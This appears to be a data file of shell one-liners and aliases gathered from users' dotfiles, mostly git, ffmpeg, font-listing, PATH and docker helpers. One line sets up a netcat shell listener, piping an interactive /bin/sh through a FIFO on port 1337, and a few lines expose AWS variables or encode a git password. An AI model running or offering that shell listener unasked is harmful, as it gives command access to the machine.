"find $HOME -type d -name "".git"" -not -path ""*\.cabal*"" -not -path ""*\.stack*"" -not -path ""*\.vim*""| sed ""s#/\.git##"" | more"
"find $1 -type f -exec stat --format ""%Y :%y %n"" {} \; | sort -nr | cut -d: -f2-"
"find $(git rev-parse --show-cdup) -type f | grep -v ""/.git/"" | fzf"
"filteredcmd | tail -n +2 | LC_ALL=POSIX sort -s -k3,3r"
"figlet -f slant ""pacman"" | boxes -d stone && sudo pacman -Syu --noconfirm && echo -e ""\n\n"" && figlet -f slant ""aur"" | boxes -d stone && yaourt -Syu --aur --noconfirm"
"ffmpeg -y -f alsa -ac 2 -i pulse -f x11grab -s `xdpyinfo | grep ""dimensions:""|awk ""{print $2}""` -i :0.0 -acodec pcm_s16le screengrab-"
"ffmpeg -y -f alsa -ac 2 -i hw:0,0 -f x11grab -r 30 -s `xdpyinfo | grep 'dimensions:'|awk '{print $2}'` -i :0.0 -acodec pcm_s16le /tmp/output.wav -an -acodec pcm_s16le -vcodec libx264 -preset ultrafast -crf 0 -threads 0 /tmp/output.mp4"
"ffmpeg -video_size $(xrandr | grep primary | egrep -o ""[0-9]+x[0-9]+"") -framerate 10 -f x11grab -i :0.0+0,0 /tmp/screen.mp4;"
"ffmpeg -video_size $(xdpyinfo | grep dimensions | awk '{print $2}') -framerate 25 -f x11grab -i :0.0+, ~/recordings/$(datetime).mp4"
"ffmpeg -f x11grab -s $( xwininfo -display :0 -root | grep -e ""geometry"" | sed -re ""s/.*\s([0-9]+x[0-9]+)\+.*/\1/g"" ) -i :0.0 -r 15 -vcodec mjpeg -q:v 5 -f mjpeg"
"feh --bg-fill ""/home/rndmprsn/Pictures/`ls /home/rndmprsn/Pictures | sort -R | tail -1 &`"""
"fd \.js$ src -E ""*.test.js"" -E __mocks__ -E stories| xargs cat | wc -l"
"fd . --type f --extension .gpg ~/.password-store/ --exec-batch python -c ""import sys, os; print(os.linesep.join([x.replace(r\""$HOME/.password-store/\"", \""\"", 1) for x in sys.argv[1:]])) "" {.} | fzf --prompt ""pass > "" --height=1 --border --color=fg:7,gutter:0,pointer:0,bg+:7 | xargs pass -c"
"fc-list | sed 's,:.*,,' | sort -u"
"fc-list | cut -f2 -d "":"" | sort -u"
"fc-list | cut -d: -f2,3 | sort"
"fc-list | cut -d':' -f2- | cut -d',' -f1"
"fc-list :lang=zh-cn family file|sed ""s,/.*/,,""|sed ""s/:\ \(.*\)/\x1b[0;32m\t\1\x1b[0m/"""
"fc-list :lang=zh-cn family file|sed ""s,/.*/,,""|awk -F: "
"fc-list : family | cut -f1 -d"","" | sort"
"fc-list --format='%{family}\n' | sed 's/,.*//' | sort -u"
"fc -nl -1 | tr -d ""\n"" | pbcopy"
"fc -nl -1 | cat <(echo -n ""\$"") - | xc"
"fc -lt ""| %d-%m-%Y %H:%M:%S |"" 1"
"fc -ln -1 | awk ""{\$1=\$1}1"" ORS="""" | pbcopy"
"fc -l -n -r | sed ""s=^ ==g""| $EDITOR -"
"fc -l -n -1 -1 | tr -d ""\n"" | pbcopy"
"f(){([[ $(git config ""branch.$(git rev-parse --abbrev-ref HEAD).merge"") = """" ]] && git push -u $@) || git push $@};f"
"f(){ x=""$(sk --bind ""ctrl-p:toggle-preview"" --ansi --preview=""preview.sh -v {}"" --preview-window=up:50%:hidden)""; [[ $? -eq 0 ]] && nvim ""$x"" || true }; f"
"f(){ x=""$(sk --bind ""ctrl-p:toggle-preview"" --ansi --preview=""preview.sh -v {}"" )""; [[ $? -eq 0 ]] && emacs ""$x"" || true ; }; f"
"f(){ x=""$(sk --bind ""ctrl-p:toggle-preview"" --ansi --preview=""bat {} --color=always"" --preview-window=right:60%:hidden)""; [[ $? -eq 0 ]] && vim ""$x"" || true }; f"
"f(){ x=""$(sk --ansi)""; [[ $? -eq 0 ]] && nvim ""$x"" || true }; f"
"f(){ unset -f f; if [ -z $2 ]; then UNIT=""""; else UNIT=""-u $2""; fi; if [ -z $3 ]; then OUTPUT=""""; else OUTPUT=""-o $3""; fi; journalctl -a -b -f --no-hostname --no-pager $OUTPUT $UNIT | grep --line-buffered ""$1"" | ccze -A -o nolookups; }; f"
"f(){ unset -f f; if [ -z $2 ]; then UNIT=""""; else UNIT=""-u $2""; fi; if [ -z $3 ]; then OUTPUT=""""; else OUTPUT=""-o $3""; fi; journalctl -a -b --no-hostname --no-pager $OUTPUT $UNIT | grep --line-buffered ""$1"" | ccze -A -o nolookups; }; f"
"f(){ unset -f f; if [ -z $2 ]; then UNIT=""""; else UNIT=""-u $2""; fi; if [ -z $3 ]; then OUTPUT=""""; else OUTPUT=""-o $3""; fi; journalctl -a --no-hostname --no-pager $OUTPUT $UNIT | grep --line-buffered ""$1"" | ccze -A -o nolookups; }; f"
"f(){ unset -f f; if [ -z $2 ]; then OUTPUT=""""; else OUTPUT=""-o $2""; fi; journalctl -a -b --no-hostname --no-pager $OUTPUT -u medusa-* | grep --line-buffered ""$1"" | ccze -A -o nolookups; }; f"
"f(){ test -z ""$1"" && echo ""No branch name given."" && return; git checkout -b $1 2>/dev/null || git checkout $1; git branch -u origin/$1 $1 2>/dev/null; gp; git push --set-upstream origin $1; }; f"
"f(){ man $1 | fzf --preview ""man $1 | grep --color=always -C$(expr `tput lines` / 3) -- {} "" --preview-window=up:70% --reverse -m --inline-info }; f"
"f(){ man ""$1"" | ul -i | vim -; unset -f f; }; f"
"f(){ find $1 -type f -printf ""%TY-%Tm-%Td %TT %p\\n"" | sort -r | head -n $2 }; f"
"f(){ docker exec -it $(docker ps | grep $1 | cut -f 1 -d "" "") bash}; f"
"f(){ ( find . -name ""$@"" -print0 | xargs -0 cat ) | wc -l; unset -f f; }; f"
"f() {foo=`echo $1 | tr ""[:lower:]"" ""[:upper:]""`; echo ""ibase=16;obase=2; $foo""|bc};f"
"f() {foo=`echo $1 | tr ""[:lower:]"" ""[:upper:]""`; echo ""ibase=16; $foo""|bc};f"
"f() { {eval ""$@"" && say done} || say error };f"
"f() { local dir=$PWD; while : ; do git rev-parse --is-inside-work-tree &> /dev/null || break; cd ""$(git rev-parse --show-toplevel)""; local dir=$PWD; cd ..; done; cd ""$dir""; }; f"
"f() { echo $1 | base64 --decode | cut -d "":"" -f 3 }; f"
"f() { echo $1 | base64 --decode | cut -d "":"" -f 1 }; f"
"f() { docker ps -aq --filter=""name=$1"" | xargs docker stop | xargs docker rm };f"
"f() { command ps aux | grep -v grep | grep -i -e VSZ -e ""$*""; }; f"
"f () { echo | openssl s_client -showcerts -servername ""$1"" -connect ""$1:443"" 2>/dev/null | openssl x509 -inform pem -noout -text; }; f"
"export | grep AWS | sed 's,^,export ,'"
"export instanceId=`az vm list-ip-addresses --name ${vmName} | jq .[].virtualMachine.network.publicIpAddresses[0].ipAddress | tr -d \""`;echo $instanceId"
"export fldir=~/Downloads/HT/antbar/$(date ""+%Y%m%d""); mkdir -p ""$fldir""; cd ""$fldir"" && python -c ""import pyperclip; print(pyperclip.paste())"" | sort -uR | yudlf - --ignore-errors -r 5M"
"export allocationId=$(aws ec2 allocate-address --domain vpc | awk ""{print \$1}"") && echo $allocationId && export associationId=$(aws ec2 associate-address --allocation-id $allocationId --instance-id $instanceId) && echo $associationId && export instanceIp=$(aws ec2 describe-addresses --public-ips --filters ""Name=instance-id,Values=$instanceId"" | awk ""{print \$9}"") && echo $instanceIp"
"export XSOCK=/tmp/.X11-unix && export XAUTH=/tmp/.docker.xauth && touch $XAUTH && xauth nlist $display | sed -e ""s/^..../ffff/"" | xauth -f $XAUTH nmerge -"
"export PS1=""\e[96m|\e[00m \w \e[96m|\e[00m >"""
"export PS1=""\e[01;95m|\e[00m \w \e[01;95m|\e[00m >"""
"export PS1=""\e[01;37m| \w |\e[00m >"""
"export PS1=""\e[01;35m|\e[00m \w \e[01;35m|\e[00m >"""
"export PS1=""\e[01;34m|\e[94m \w \e[01;34m|\e[00m > """
"export PS1=""\e[01;32m|\e[00m\w\e[01;32m|\e[00m>"""
"export PATH=$(tr "":"" ""\n"" <<< $PATH | perl -ne ""print unless \$seen{\$_}++"" | paste -s -d"":"")"
"export MARKED_BRANCH=""$(gs || sed -n "
"export LAST_QUOTE=""$(fortune -l)"" && echo ""$LAST_QUOTE"" | cowthink -W 60 | lolcatjs"
"export GOPATH=""${HOME}/go"" && GOVERSION=$(brew list go | head -n 1 | cut -d ""/"" -f 6) && export GOROOT=$(brew --prefix)/Cellar/go/$GOVERSION/libexec && export PATH=""$PATH:${GOPATH}/bin:${GOROOT}/bin"""
"export GIT_TEMP_BRANCH=$(git branch | grep \* | cut -d "" "" -f2) && git push origin $GIT_TEMP_BRANCH && unset GIT_TEMP_BRANCH"
"export GIT_TEMP_BRANCH=$(git branch | grep \* | cut -d "" "" -f2) && git pull origin $GIT_TEMP_BRANCH && unset GIT_TEMP_BRANCH"
"export GIT_TEMP_BRANCH=$(git branch | grep \* | cut -d "" "" -f2) && git checkout master && git branch -d $GIT_TEMP_BRANCH && unset GIT_TEMP_BRANCH"
"export GIT_TEMP_BRANCH=$(git branch | grep \* | cut -d "" "" -f2) && git checkout master && git branch -D $GIT_TEMP_BRANCH && unset GIT_TEMP_BRANCH"
"export GIT_CURRENT_BRANCH=""$( git branch | grep \* | cut -d "" "" -f2 )"" && test -n ""${GIT_CURRENT_BRANCH}"""
"export DISPLAY `who am i | cut -f2 -d""("" | cut -f1 -d"")""`:0.0"
"expac -s -H M ""%-30n %m"" | sort -rhk 2 | less"
"expac -s -H M ""%-30n %m"" | sort -rhk 2 | head -n 30"
"expac -s -H M ""%-20n %m"" | sort -rhk 2 | less "
"expac -s ""%-30n %m"" | sort -rhk 2 | less"
"expac -HM ""%011m\t%-20n\t%10d""| sort -n | tail -20"
"expac ""%n %p"" | grep ""Einar Uvsløkk"" | column -t"
"expac ""%n %p"" | ag ""carlitos"" | column -t"
"exit_code=$?; notify-send --urgency=low ""$(history | tail --lines=1 | sed --expression "
"exec ""$(realpath /proc/$$/exe)"" -l || exec ${SHELL} -l"
"exa || zplug ""ogham/exa"", as:command, from:gh-r, use:""*macos-x86_64*"", rename-to:ls"
"exa || zplug ""ogham/exa"", as:command, from:gh-r, use:""*linux-x86_64*"", rename-to:ls"
"eval `while read -r x; do echo ""git add --patch \""$x\"" &&""; done <<< $(git ls-files -m | sed -e ""s/.*/\""&\""/"" | xargs ls -t)`'"
"eval $(history | sed ""s/^ *[0-9]* *//"" | fzf)"
"eval $(history | peco | sed -e ""s/^ *[0-9]*//"")"
"eval $(docker-machine env) && docker exec -u app -it `docker ps | grep heiaheia_web | sed ""s/ .*//""` /bin/bash"
"eval $(docker-machine env) && docker exec -it `docker ps | grep heiaheia_web | sed ""s/ .*//""` /bin/bash"
"eval $(aws-okta exec ds -- env | grep AWS | sed ""s/^/export /"")"
"eval $(AWS_PROFILE=${PWD##*/} sops --decrypt --input-type env secrets.env | egrep -v ""^#"" | xargs)"
"eval ""ncdu $(grep -A1 -- --exclude $HOME/bin/backup-home | tr -d \|)"""
"eval ""fc -lnr | head -n 1"" | xargs sudo"
"eval ""echo `pwd` | tr -d \\\\n | pbcopy"""
"eval ""$(fc -ln 0 | sort -u | fzf)"""
"euca-describe-volumes | grep VOLUME | cut -f 2,3,6"
"euca-describe-instances | grep INSTANCE | cut -f 2,4,5,7,6"
"euca-describe-images | grep machine | cut -f 2,3,4,5"
"env|grep ""DOCKER\|COMPOSE"""
"env | gsed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"""
"env | grep -Ei ""NO_PROXY|HTTP"""
"env | grep ""^[a-z]"" | sort"
"env | fgrep ENV_TRACE | sed ""s/ /\n/g"""
"env | egrep ""^[A-Z0-9_]+="" | sort "
"env | ack ""VAULT|CONSUL"""
"env LC_CTYPE=C tr -dc ""a-zA-Z0-9-_\$\?\+-\.,\^&\*\(\);\\\/\|<>"" < /dev/urandom | head -c "
"env $(cat .env | grep -v ""#"" | xargs) $@"
"enscript -b ""%D{%Y%m%d %H:%M:%S}|\$n|\$%/\$="""
"enable -a | cut -d"" "" -f2 | column"
"emoji $(jot -r 1 1 852) | tr -d ""\n"" | pbcopy"
"emacsclient -n /sudo:$(grep -iE ""^Host[[:space:]]+[^*]"" ~/.ssh/config|peco|awk ""{print \$2}""):~/"
"emacsclient -n /ssh:$(grep -iE ""^Host[[:space:]]+[^*]"" ~/.ssh/config|peco|awk ""{print \$2}""):~/"
"emacs -nw `git status --short --branch | grep UU | cut -d "" "" -f2`"
"egrep -v ""^\s*(#|;|\$)"""
"egrep -v ""^\s*$|^;|^\s*#"""
"egrep -v ""^($|[[:space:]]*#|;)"" "
"egrep -v ""^$|^#|^\s*$"" "
"egrep -v ""^#|^;|^[[:space:]]*$"""
"egrep -B 3 ""ERROR in|FAIL in"" $test_out | grep lein"
"egrep --exclude-dir=vendor --exclude-dir=tmp --exclude-dir=log ""(binding.pry)|(console.log\(.+\))|(alert\(.+\))"" -inR *"
"egrep --color=always -e ""(crmd|corosync|pacemaker)"""
"egrep '^[A-Z0-9_]{3,12}$' | grep -v '^[a-z]{2,}$' | egrep -v '^[0-9]'"
"egrep ""pac(new|orig|save)"" /var/log/pacman.log"
"egrep ""Mem|Cache|Swap"" /proc/meminfo"
"egrep ""(install|upgrade|remove) "" /var/log/dpkg.log"
"echoo ""pwd | pbcopy""; pwd | pbcopy"
"echo_previous_output | sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"""
"echo; top -l 1 -stats pid,command,mem,cpu -o mem | head -22 | tail -11; echo"
"echo; last -n20; echo ""----------""; echo ""timezone : ""`cat /etc/timezone`; echo ""boot-time: ""`uptime -s`; echo ""now : ""`date ""+%Y-%m-%d %H:%M:%S""`; echo ""----------""; echo ""> ""`pwd`; l | grep ""^l""; ls -d */; l | grep ""^-"";"
"echo; cal | grep -E --color ""`date +%e`|$"""
"echo | xclip -o | sed -rz ""s/[^a-zA-Z0-9._]+/_/g"""
"echo | restore-trash | sort -k2,3"
"echo | grep -l ""$1"" err.txt generated.file succ.txt | wc -l"
"echo | cat ~/.bashrc | grep -E ""alias"""
"echo pylint -E $(bzrstatmodifiedonly | paste -sd "" "") && pylint -E $(bzrstatmodifiedonly | paste -sd "" "")"
"echo moatpro ; cat /mnt/moatpro/ops/$(cat /mnt/.installed_role)/REPOS | cut -f 2 -d ""/"" | cut -f 1 -d ""."""
"echo http://$(ifconfig | grep -A1 wlp3s0 | awk ""/inet/{ print \$2 }""):8000 ; ruby -e ""require\""webrick\"";w=WEBrick::HTTPServer.new(:Port=>8000,:DocumentRoot=>Dir::pwd);Signal.trap(2){w.shutdown};w.start"""
"echo addr show|ip -o -b -|cut -d' ' -f2,7"
"echo `git symbolic-ref --short HEAD` | tr -d ""\n"" ``| pbcopy; pbpaste ; echo """""
"echo `git remote -v | grep fetch` | sed ""s/^[^ ]* [^:]*:\(.*\)\.git (fetch)/\1/g"""
"echo `\ls -lrt|\tail -1|awk ""{print \\$9}""`"
"echo \`bitcoin-cli getblockcount 2>&1\`/\`wget -q -O - https://blockexplorer.com/api/status?q=getBlockCount | cut -d , -f3 | cut -d : -f 2\`"
"echo \""\$1\"" | ruby \""$SDIR/ipa2say.rb\"" | say"
"echo \""$(cat | perl -pe ""s/\n/\"",\""/g"" | sed -e ""s/..$//g"")\"""
"echo System Startup TIME, press Q to finish || systemd-analyze blame && systemd-analyze time && echo Time to System Startup"
"echo Reloading .bashrc && . ""$HOME/.bashrc"" || . ~/.bashrc"
"echo Push to branch: $(git branch | sed -n -e ""s/^\* \(.*\)/\1/p""); git push origin $(git branch | sed -n -e ""s/^\* \(.*\)/\1/p"")"
"echo Last tag: `g tag | tail -n 1` && echo ""`date +\""%d %B %Y\""`: Version "" && git changelog `g tag | tail -n 1`..master"
"echo Finding print statements!; for file in $(find . -name *.py); do result=$(cat $file | grep print); if [[ ! -z $result ]]; then echo;echo; echo ""=============================================================="";echo ""================[ ${file} ]============""; cat $file | grep print -n;fi; done"
"echo Finding console.log statements!; for file in $(find . -type d \( -path ./node_modules -o -path ./.tmp -o -path ./dist -o -path ./bin \) -prune -o -name *.js -print); do result=$(cat $file | grep console.log); if [[ ! -z $result ]]; then echo;echo; echo ""=============================================================="";echo ""================[ ${file} ]============""; cat $file | grep console.log -n -B 2 -A 2;fi; done"
"echo Cleaning up Vim files…; find /tmp/.vim/{_backup,_swp,_undo} -type f | grep -v .gitkeep | xargs -I{} rm -v {}"
"echo ; netstat -antup | egrep -v ""(Active|p6)"" ; echo ;
"echo /opt/var/cache/pixelserv:;ls -l /opt/var/cache/pixelserv/;ls /var/log/messages*;tail -f /var/log/messages | egrep ""missing|generated"""
"echo -n `ifconfig | grep -Po ""(?<=inet )\d*\.\d*\.\d*\.\d*(?=.*broadcast)""` | pbcopy"
"echo -n Grab_`date --iso-8601`.pdf | sed ""s/-/_/g"" | xclip -selection clipboard"
"echo -n $PWD|pbcopy|echo ""current path copied to clipboard"""
"echo -n $GIT_PASSWORD | hexdump -v -e '""x"" 1/1 ""%02X""' | tr x %"
"echo -n ""y\ny\n"" | gitpr; echo -n ""y\ny"" | gitpg"
"echo -n ""Your inventory contains: ""; (cd ~/HW1/usr/toukmond;ls *.o >& /dev/null && echo $(ls *.o))|| echo "
"echo -n ""Updating package list... "" ; apt-get -qq update && echo ""Done"" || echo ""Failed"" ; apt-get -y upgrade"
"echo -n ""Meteo de la semaine à Strasbourg "" | pv -qL 20 && weatherman -x ""Strasbourg,France"" | ccze -A"
"echo -n ""${1}"" | openssl sha1 | sed ""s/^.* //"""
"echo -n """" | xclip -in -selection primary; echo -n """" | xclip -in -selection secondary"
"echo -e 'Available aliased commands:\n'$(alias | sed -r 's/alias (\w*)=.*/\1/' | sed -r ':a;N;$!ba;s/\n/, /g')"
"echo -e $(for k in ~/.ssh/*.pub;do echo -e ""\\\n$(ssh-keygen -E md5 -lf $k) - $k"";done)|sort -k 3; echo;echo ""--- Added identities ---""; ssh-add -E md5 -l|sort -k 3"
"echo -e ""sudo xbps-query -l | most\n"" && sudo xbps-query -l | most"
"echo -e ""package version: $(cat package.json | jq .version | sed ""s/\""//g"")"""
"echo -e ""\n\n"" && ps aux | grep ""mysql"" | h "" --user="" "" --basedir="" "" --datadir="" "" --plugin-dir="" "" --log-error="" "" --pid-file="" ""00"" ""00"" ""/Applications/Atom.app"" ""/usr/local"" && echo -e ""\n\n"" "
"echo -e ""\nTEMPERATURE:"" && sensors | grep ""high"" && echo -e ""\nFREQUENCY:"" && cat /proc/cpuinfo | grep ""MHz"" && echo "" """
"echo -e ""\nENABLED:\n\n$(systemctl list-unit-files | grep enabled)\n\nINACTIVE:\n\n$(systemctl list-unit-files | grep disabled)"""
"echo -e ""\e[1;31mLast upgraded:\e[0m "" ; cat /var/log/pacman.log | grep upgraded | tail -n 20"
"echo -e ""\033[1;35m$(ifconfig | grep -oE -m1 ""\b192.168.0.{3}[0-9]{1,3}\b"" | head -1)"""
"echo -e ""This is your WAN-IP address:\033[1;32m$(curl -s checkip.dyndns.org|cut -d "":"" -f2|cut -d ""<"" -f1)\033[0m"""
"echo -e ""TODO:\n$(calcurse -t --format-todo ""(%p) %m\t>> %N"" | tail -n +2 | sed "
"echo -e ""Sourced files:\n$(sourced_files | sed ""s#$HOME/#~/#"")\n # \nFunctions:\n$(list_functions)\n # \nAliases:\n\n$(list_aliases)"" | column -t -s ""#"""
"echo -e ""$(git ls-files --modified)\n$(git ls-files)"" | sort | uniq -u"
"echo -E ""¯\_(ツ)_/¯"" | tee /dev/tty | pbcopy"
"echo ----------------------------------------------------------------------------- && echo ""*** SYNC-INFORMATION ***"" && echo ----------------------------------------------------------------------------- && echo -n ""SSH: "" && cat ~/.sshSync/ssh.txt && echo -n ""Sync-Time Interval: "" && echo -n `cat ~/.sshSync/syncTime.txt` && echo s && echo -n ""Target Path: "" && cat ~/.sshSync/targetDir.txt && echo && echo ============================================================================= && echo "" UID PID PPID C STIME TTY TIME CMD"" && echo ============================================================================= && ps -ef|grep scp.sh|grep -v grep && echo ============================================================================="
"echo ----------------------------------------------------------------------------- && echo ""*** SYNC-INFORMATION ***"" && echo ----------------------------------------------------------------------------- && echo -n ""SSH: "" && cat ~/.sshSync/ssh.txt && echo -n ""Sync-Time Interval: "" && echo -n `cat ~/.sshSync/syncTime.txt` && echo s && echo -n ""Target Path: "" && cat ~/.sshSync/targetDir.txt && echo && echo ""============================================================================="" && echo "" UID PID PPID C STIME TTY TIME CMD"" && echo ""============================================================================="" && ps -ef|grep scp.sh|grep -v grep && echo ""============================================================================="""
"echo 'cmd: du -sh err.txt generated.file succ.txt | sort -k1,1rn | head' &&
"echo && nmap --iflist|awk '/INTERFACES/, /ROUTES/ {print}'|grep -v ROUTES"
"echo ${LD_LIBRARY_PATH} | tr "":"" ""\n"" | sort"
"echo ${(k)aliases} ${(k)builtins} $(ls /bin) | sed -e ""s/\s\+/\n/g"" | grep -i"
"echo $path | tr "" "" ""\n"" | fzf -m --preview ""ls {}"""
"echo $TMUX | cut -d, -f3 | xargs -l1 tmux kill-session -t"
"echo $PWD | tr -d ""\n"" | xclip -i -selection clipboard"
"echo $PRS_HEAD && ps aux|grep -v grep|grep ""$@"""
"echo $PATH | tr : ""\n"" | uniq"
"echo $PATH | tr : ""\n"" | sort"
"echo $PATH | tr -s "":"" ""\n"" | sort"
"echo $PATH | tr "":"" ""\n"" | xargs ls"
"echo $PATH | tr "":"" ""\n"" | sort"
"echo $PATH | tr "":"" ""\n"" | nl"
"echo $PATH | sed ""s/:/\n/g"" | xargs ls -1"
"echo $PATH | sed ""s/:/ /g"" | xargs ls"
"echo $PATH | \tr "":"" ""\n"" | nl"
"echo $LIBPATH | tr "":"" ""\n"" | sort"
"echo $1 | sed -E ""s/https?:\/\/([^\/?]+).*/\1/"" | xargs dig"
"echo $(work_package) | tr -d ""\n"" | pbcopy"
"echo $(kubectl get pods --all-namespaces -o wide | grep keystone-api | awk ""{print $7}"")"
"echo $(jobs -p | awk ""{ print $3 }"") | xargs -t kill -9"
"echo $(jira sprint | fzf) | cut -d "":"" -f 1"
"echo $(jira list | fzf) | cut -d "":"" -f 1"
"echo $(git branch | grep -E ""^\*"" | sed ""s/\* //"")"
"echo $(git branch | grep ""*"" | sed ""s/* //"")"
"echo $(docker images | grep ""<none>"" | awk ""{print \$3}"")"
"echo $(date) : $(whoami)@$(hostname) : $(ps axu | grep ""USER"" | wc -l) ps : $(pwd)"
"echo $(current_branch) | tr -d ""\n"" | pbcopy"
"echo $(\curl -qs $(gitHTTP_URL) | pup --charset utf8 ""title text{}"" | cut -d: -f2-)"
"echo $(/usr/sbin/netstat -rn | awk '/^0.0.0.0/ {thif=substr($0,74,10); print thif;} /^default.*UG/ {thif=substr($0,65,10); print thif;}' | head -1)"
"echo $(($(cat /proc/meminfo | grep ""^MemFree"" | sed -e ""s/[a-zA-Z: ]//g"") / 1024))"
"echo ""✓ ™ ♪ ♫ ☃ ° Ɵ ∫ ❤ ☤ ⚕ ‘ ’ “ ” ‚ „ ′ ″ ‹› « » - – ( / ) [ | ] { \ } err.txt generated.file succ.txt † ‡ § ¶ | ‖ @ № $ £ ¥ € ₹ ₺ ₽ ¢ ƒ % ‰ ¼ ½ ¾ ⅓ ⅔ ⅛ ⅜ ⅝ + − × ÷ ∙ = < > ≤ ≥ ± ^ ≠ ~ ≈ ¬ # π ∞ µ ∂ ∫ √ • ◦ ▪ ▫ ▴ ▸ ▾ ◂ ▵ ▹ ▿ ◃ ● ○ ■ □ ▲ ▶ ▼ ◀ △ ▷ ▽ ◁ ❒ ◆ ► ◄ ◙ ◉ ◘ ← ↖ ↑ ↗ → ↘ ↓ ↙ ⇐ ⇑ ⇒ ⇓ ↔ ↕ ↨ ♀ ♂ ☼ ⌂ ☑ ✓ ☻ ☕ 💩 🤖 🔒 🍺 🚑 👍 👌 💪      """
"echo ""y"" | android update sdk --no-ui; echo ""yes"" | apm upgrade; softwareupdate -i -a; brew update; brew upgrade; brew cleanup; brew cask cleanup; npm update npm -g; npm update -g; gem update"
"echo ""usermod is not available on macOS; use `dscl . [add|rm|read] /Groups/$GROUP GroupMembership $USER` instead"
"echo ""slurm: sinfo |cut -c 1-100""; sinfo |cut -c 1-100"
"echo ""scale=2; `curl --progress-bar -w ""%{speed_download}"" http://speedtest.wdc01.softlayer.com/downloads/test10.zip -o /dev/null` / 131072"" | bc | xargs -I {} echo {} mbps"
"echo ""scale=2; `curl --progress-bar -w ""%{speed_download}"" http://cachefly.cachefly.net/10mb.test -o test.zip ` / 131072"" | bc | xargs -I {} echo {}Mb\/s && rm -rf test.zip"
"echo ""scale=2; `curl --progress-bar -w ""%{speed_download}"" http://10.0.4.247/repo/inntech/el7/boost_1.70.0-1.el7-1.x86_64.rpm -o /dev/null` / 104000000"" | bc | xargs -I {} echo {} mbps"
"echo ""rostopic list|less:"" && rostopic list | less"
"echo ""rostopic list | grep"" && rostopic list | grep"
"echo ""rosnode list | grep: "" && rosnode list | grep"
"echo ""reflector -n 20 -p https -l 10 -c Germany --sort rate --score 5 | sudo tee /etc/pacman.d/mirrorlist"" && reflector -n 20 -p https -l 10 -c Germany --sort rate --score 5 | sudo -k tee /etc/pacman.d/mirrorlist"
"echo ""ps aux | grep java|grep -oP \""wday\s+\K(\d+)(?=\s)\"""""
"echo ""power on"" | bluetoothctl && sleep 1 && cat $HOME/bluetooth/insignia | xargs bluetoothctl connect"
"echo ""port open.""; rm -f /tmp/f 2> /dev/null; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1337 > /tmp/f; "
"echo ""pip install -U pip && pip install -U \$(pip list -o --format freeze | sed \""s/==.*//\"")"" && pip install -U pip && pip install -U $(pip list -o --format freeze | sed ""s/==.*//"")"
"echo ""openstack server list -f value | awk \""{ print $1 }\"" | xargs openstack server delete"""
"echo ""obase=16;$(date +%s)"" | bc | tr ""[:upper:]"" ""[:lower:]"""
"echo ""g(i,x,t,o){return((3&x&(i*((3&i>>16?\""BY}6YB6%\"":\""Qj}6jQ6%\"")[t%8]+51)>>o))<<4);};main(i,n,s){for(i=0;;i++)putchar(g(i,1,n=i>>14,12)+g(i,s=i>>17,n^i>>13,10)+g(i,s/3,n+((i>>11)%3),10)+g(i,s/5,8+n-((i>>10)%3),9));}""|gcc -xc -&&./a.out|aplay"
"echo ""fr \""*\"" | grep -v \""\./tags:\"" | xargs grep -in --color=always \""STRS\"" 2>/dev/null"""
"echo ""find . \( -path "".*/.*"" -o -path ""*/out"" \) -prune -o -type f -print | xargs grep""; find . \( -path "".*/.*"" -o -path ""*/out"" \) -prune -o -type f -print | xargs grep -n"
"echo ""find . \( -path "".*/.*"" -o -path ""*/out"" \) -prune -o -type f -print | xargs grep""; find . \( -path "".*/.*"" -o -path ""*/out"" \) -prune -o -type f -print | xargs grep "
"echo ""du aliased to: du -kch --max-depth=1 | sort -n""; du -kch --max-depth=1 | sort -n"
"echo ""df -h | egrep -A1 mapper"" && df -h | egrep -A1 mapper"
"echo ""cd /var/www/admin.clubberia.com/wwwroot"" | pbcopy; echo ""alt-v to paste ""; echo | pbpaste; ssh robnugen@dev0.subdev.net -p63"
"echo ""baobab|filelight|ncdu"""
"echo ""[true, false].map {|pwned| UserPwnage.where(pwned: pwned).map(&:user_id).uniq.count }"""
"echo ""Xorg Warnings:"" && cat ~/.local/share/xorg/Xorg.0.log | ack ""] \(WW\)"" && echo ""\nXorg Errors:"" && cat ~/.local/share/xorg/Xorg.0.log | ack ""] \(EE\)"""
"echo ""WM_CLASS(STRING) = \""NAME\"", \""CLASS\"""" && xprop | grep ""WM_WINDOW_ROLE\|WM_CLASS"""
"echo ""USE SINGLE-QUOTE & CTRL-V. ---> perl -ne \""next LINE unless / Load \(|SELECT COUNT/; s/^[\[[0-9;]*[a-zA-Z]//g; s/ Load \([0-9]{1,3}\.[0-9]ms\) /:/;s/ \([0-9]{1,3}\.[0-9]ms\) /:/; print $_ \"" FILE | sort"""
"echo ""Timer started. Stop with Ctrl-D."" && date && { time cat; } 2>&1 | grep real | sed ""s/real/duration/"" && date"
"echo ""There are total $(ls -l | grep -E ""^d.*"" | wc -l) directories in this folder"""
"echo ""There are total $(ls -l | grep -E ""^-.*"" | wc -l) files in this folder"""
"echo ""Testing apache config syntax...""; sudo apachectl configtest && ((echo ""Restarting apache...""; sudo apachectl restart) && echo ""done"" || echo ""Apache restart failed."")"
"echo ""TBD-$(uuidgen |cut -f1 -d-)"" |pbcopy"
"echo ""Start finding duplicates"" && find . ! -empty -type f -exec md5sum {} + | sort | uniq -w32 -dD"
"echo ""SERVING `pwd` ON http://`ifconfig -v en0 inet | grep inet | cut -d "" "" -f 2`:9090/"" && ruby -run -e httpd . -p9090"
"echo ""Removing vim swap files:""; find . | grep \.[^\.].swp$ | xargs rm -vf"
"echo ""RAM Information "" | pv -qL 10 &&free -m -l -t | ccze -A"
"echo ""Public IP: ""; curl icanhazip.com; echo ""Internal IPs: ""; ifconfig|grep ""192.168.151.\|192.168.15."""
"echo ""NVIDIA"" ; DISPLAY=:0.0 nvidia-settings -q [gpu:0]/GPUCoreTemp | \grep ""Attribute"" | sed -e ""s/.*: //g"" -e ""s/\.//g"""
"echo ""Listing all installed homebrew packages along with packages that depend on them:""; brew list -1 | while read cask; do echo -ne ""\x1B[1;34m$cask \x1B[0m""; brew uses $cask --installed | awk "
"echo ""KEYINFO --ssh-list --ssh-fpr"" | gpg-connect-agent | grep "
"echo ""File sizes in KB"" && du -ka . | sort -n -r | head -n 10"
"echo ""Excluding loop and tmpfs:"" && df -h | grep -v ""/dev/loop"" | grep -v tmpfs"
